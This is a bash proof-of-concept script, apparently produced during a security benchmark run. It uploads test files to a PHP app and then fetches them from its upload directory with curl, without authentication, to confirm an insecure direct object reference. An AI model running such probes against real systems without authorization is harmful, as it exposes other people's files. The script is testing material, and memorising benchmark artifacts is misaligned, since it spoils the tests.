#!/bin/bash
# POC: Demonstrates IDOR vulnerability by uploading files and accessing them without authentication via predictable filenames
# Target: ./repo
# Created: 2025-11-07T17:10:47.697Z
# Session: benchmark-XBEN-067-24-mhp3pdwz

# IDOR (Insecure Direct Object Reference) - Unauthorized File Access POC
# This script demonstrates unauthorized access to uploaded files through direct HTTP requests
# without any authentication or authorization checks

set -e

TARGET_URL="${1:-http://localhost:8080}"
UPLOAD_ENDPOINT="${TARGET_URL}/index.php"
FILES_ENDPOINT="${TARGET_URL}/upload"

echo "[*] IDOR Vulnerability POC - Unauthorized File Access"
echo "[*] Target: $TARGET_URL"
echo ""

# Test files to upload with predictable names
declare -a TEST_FILES=(
    "admin_report.jpg"
    "user_1_data.jpg"
    "user_2_data.jpg"
    "confidential_report.jpg"
    "admin_users.jpg"
)

# Step 1: Upload test files
echo "[*] Step 1: Uploading test files to $UPLOAD_ENDPOINT"
for filename in "${TEST_FILES[@]}"; do
    # Create a temporary test file with content
    echo "Test content for $filename - $(date)" > "/tmp/$filename"
    
    # Upload using multipart form data
    response=$(curl -s -w "\n%{http_code}" -F "file=@/tmp/$filename" "$UPLOAD_ENDPOINT" 2>/dev/null || true)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "201" ]]; then
        echo "[✓] Uploaded: $filename (HTTP $http_code)"
    else
        echo "[!] Upload failed for $filename (HTTP $http_code)"
    fi
    
    rm -f "/tmp/$filename"
done

echo ""
echo "[*] Step 2: Testing unauthorized file access without authentication"
echo "[*] Attempting to access uploaded files directly..."
echo ""

# Step 2: Attempt to access files without authentication
ACCESSIBLE_COUNT=0
for filename in "${TEST_FILES[@]}"; do
    file_url="${FILES_ENDPOINT}/${filename}"
    
    # Try to access the file without any authentication
    response=$(curl -s -w "\n%{http_code}" "$file_url" 2>/dev/null || true)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    if [[ "$http_code" == "200" ]]; then
        echo "[✓] VULNERABLE: $filename is accessible (HTTP $http_code)"
        echo "    URL: $file_url"
        ACCESSIBLE_COUNT=$((ACCESSIBLE_COUNT + 1))
    elif [[ "$http_code" == "403" ]] || [[ "$http_code" == "401" ]]; then
        echo "[✗] File protected: $filename (HTTP $http_code)"
    elif [[ "$http_code" == "404" ]]; then
        echo "[!] File not found: $filename (HTTP $http_code)"
    else
        echo "[?] Unexpected response: $filename (HTTP $http_code)"
    fi
done

echo ""
echo "[*] Step 3: Analyzing authorization mechanism"
echo "[*] Checking for authentication requirements..."

# Test if authorization headers are required
for filename in "${TEST_FILES[@]}"; do
    file_url="${FILES_ENDPOINT}/${filename}"
    
    # Check response headers for auth-related indicators
    headers=$(curl -s -I "$file_url" 2>/dev/null || true)
    
    if echo "$headers" | grep -qi "www-authenticate\|authorization"; then
        echo "[!] Authorization header detected for $filename"
    else
        echo "[✓] No authorization required for $filename"
    fi
    
    break  # Just check first file for headers
done

echo ""
echo "[*] RESULTS:"
echo "    Files successfully accessed: $ACCESSIBLE_COUNT / ${#TEST_FILES[@]}"

if [[ $ACCESSIBLE_COUNT -gt 0 ]]; then
    echo "[!] IDOR VULNERABILITY CONFIRMED"
    echo "[!] Unauthorized users can access uploaded files"
    exit 0
else
    echo "[✓] All files properly protected"
    exit 1
fi